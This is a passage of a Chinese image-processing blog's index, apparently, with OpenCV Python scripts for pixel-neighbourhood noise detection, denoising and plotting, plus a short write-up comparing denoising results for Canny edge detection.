class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">python<span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>],</span><br><span class="line">         _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>], _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 求差异度</span></span><br><span class="line">    max1 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> p[i] &gt; max1:</span><br><span class="line">            max1 = p[i]</span><br><span class="line">    min2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> p[i] &lt; min2:</span><br><span class="line">            min2 = p[i]</span><br><span class="line">    <span class="keyword">return</span> max1 - min2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求差异度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_d</span>(<span class="params">img</span>):</span></span><br><span class="line">    row, col = img.shape</span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        result[i] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col - <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># _8_area = type(img_channel)</span></span><br><span class="line">            _8_area = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">0</span>] = img[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">1</span>] = img[i - <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">2</span>] = img[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">2</span>] = img[i][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">2</span>] = img[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">1</span>] = img[i + <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">0</span>] = img[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">0</span>] = img[i][j - <span class="number">1</span>]</span><br><span class="line">            result[division(_8_area)] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 图像地址</span></span><br><span class="line">    origin_address = <span class="string">&quot;origin.png&quot;</span></span><br><span class="line">    denoise_address = <span class="string">&quot;denoise.png&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 以灰度方式读入图像</span></span><br><span class="line">    origin_img = cv.imread(origin_address, <span class="number">0</span>)</span><br><span class="line">    denoise_img = cv.imread(denoise_address, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 求差异度</span></span><br><span class="line">    d_origin = get_d(origin_img)</span><br><span class="line">    d_denoise = get_d(denoise_img)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 制图</span></span><br><span class="line">    x = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        x[i] = i</span><br><span class="line">    plt.plot(x, d_origin, color=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    plt.plot(x, d_denoise, color=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">    <span class="comment"># plt.axis([1, 60, -1, 50])</span></span><br><span class="line">    <span class="comment"># 用来正常显示中文标签</span></span><br><span class="line">    plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line">    <span class="comment"># 用来正常显示负号</span></span><br><span class="line">    plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 标题</span></span><br><span class="line">    plt.title(<span class="string">&#x27;差异度折线图(红色原图/蓝色处理图)&#x27;</span>, fontsize=<span class="number">24</span>, color=<span class="string">&#x27;black&#x27;</span>)</span><br><span class="line">    plt.show()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210523</title>
      <link href="/20210523-img-report/"/>
      <url>/20210523-img-report/</url>
      
        <content type="html"><![CDATA[<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011603074.png" alt="img"></p><p>可以看到，大部分白色噪声都被去除，只有部分连块的“较大”噪声没有去除。不过我们暂时可以不用管它，因为只需要多次利用该算法（如果遇到仍无法解决的情况，那么再附加“缩小二分之一”图像的检测就可以了）</p><h2 id="考虑该算法是否合理"><a href="#考虑该算法是否合理" class="headerlink" title="考虑该算法是否合理"></a>考虑该算法是否合理</h2><p>这里考虑的条件仅为是否会对直线检测造成影响（直线检测算法暂时利用opencv中的canny算子）</p><p>下面是降噪前和降噪后的样例：</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011604866.png" alt="img">降噪前</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011604535.png" alt="img">降噪后</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011604009.png" alt="img">旧算法降噪后</p><p>首先新算法降噪前后，对canny检测几乎没有影响，甚至还有一定程度的提升</p><p>但旧的算法会使边缘变得不平滑，这体现出了新算法的优势之一</p><h2 id="噪声条件更加恶劣"><a href="#噪声条件更加恶劣" class="headerlink" title="噪声条件更加恶劣"></a>噪声条件更加恶劣</h2><p>噪声值也为随机时</p><p><img src="https://cdn.jsdelivr.net/gh/Chaos-xBug/img/blog/202111011604617.png" alt="img"></p><p>可以看出效果不错</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">1.找出噪声点：</span></span><br><span class="line"><span class="string">    新划分方法</span></span><br><span class="line"><span class="string">    标记次数</span></span><br><span class="line"><span class="string">2.修改</span></span><br><span class="line"><span class="string">    找最接近的未标记过的点</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">threshold = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PixelChannel</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, channel, noise, row, col</span>):</span></span><br><span class="line">        self.noise = noise</span><br><span class="line">        self.channel = channel</span><br><span class="line">        self.row = row</span><br><span class="line">        self.col = col</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x, y, area</span>):</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.area = area</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立像素通道类</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_pixel_channel</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = PixelChannel(img_channel, noise_check(img_channel), row, col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一维数组映射到二维</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_1d_2_2d</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division1</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p1 = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line">          _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p = <span class="built_in">sorted</span>(p1)</span><br><span class="line">    q = [<span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>])),</span><br><span class="line">         <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>]))]</span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(q) &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    max_index = q.index(<span class="built_in">max</span>(q))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">        result[p1.index(p[i])] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] != <span class="number">1</span>:</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除del_num号元素，del_num:0~7</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division2</span>(<span class="params">_8area, del_num</span>):</span></span><br><span class="line">    r = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p1 = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line">          _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> i == del_num:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        p2.append(p1[i])</span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    p = <span class="built_in">sorted</span>(p2)</span><br><span class="line">    q = [<span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>])),</span><br><span class="line">         <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>]))]</span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(q) &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    max_index = q.index(<span class="built_in">max</span>(q))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">        result[p1.index(p[i])] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] != <span class="number">1</span>:</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">    result[del_num] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noise_check</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = [[<span class="number">0</span>] * col <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col - <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># _8_area = type(img_channel)</span></span><br><span class="line">            _8_area = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">0</span>] = img_channel[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">1</span>] = img_channel[i - <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">2</span>] = img_channel[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">2</span>] = img_channel[i][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">2</span>] = img_channel[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">1</span>] = img_channel[i + <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">0</span>] = img_channel[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">0</span>] = img_channel[i][j - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 不考虑位置</span></span><br><span class="line">            part1, flag1 = division1(_8_area)</span><br><span class="line">            <span class="comment"># 如果在不去除点的情况下，不需要划分，那么就跳过</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> flag1:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            part2 = []</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">                cnt = <span class="number">0</span></span><br><span class="line">                part2, flag2 = division2(_8_area, k)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> flag2:</span><br><span class="line">                    <span class="keyword">if</span> k == <span class="number">0</span> <span class="keyword">or</span> k == <span class="number">7</span>:</span><br><span class="line">                        cnt += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                <span class="comment"># 比较</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> m <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                    <span class="keyword">if</span> part2[m] != <span class="number">0</span> <span class="keyword">and</span> part1[m] != part2[m]:</span><br><span class="line">                        cnt += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> cnt &gt;= <span class="number">1</span>:</span><br><span class="line">                    x, y = _1d_2_2d(k)</span><br><span class="line">                    result[i - <span class="number">1</span> + x][j - <span class="number">1</span> + y] += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 处理特殊值</span></span><br><span class="line">            <span class="comment"># sx, sy = special_check(_8_area)</span></span><br><span class="line">            <span class="comment"># if sx != -1:</span></span><br><span class="line">            <span class="comment">#     result[i - 1 + sx][j - 1 + sy] += 1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不考虑缩小二分之一图像</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mark</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.col):</span><br><span class="line">            <span class="keyword">if</span> pixel_channel.noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.channel[i][j] = find_best(pixel_channel, i, j)</span><br><span class="line">    <span class="keyword">return</span> pixel_channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到最合适的值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_best</span>(<span class="params">pixel_channel, x, y</span>):</span></span><br><span class="line">    p = pixel_channel.channel[x][y]</span><br><span class="line">    <span class="comment"># 建立领域列表</span></span><br><span class="line">    neighborhood = []</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][y] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x][y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + 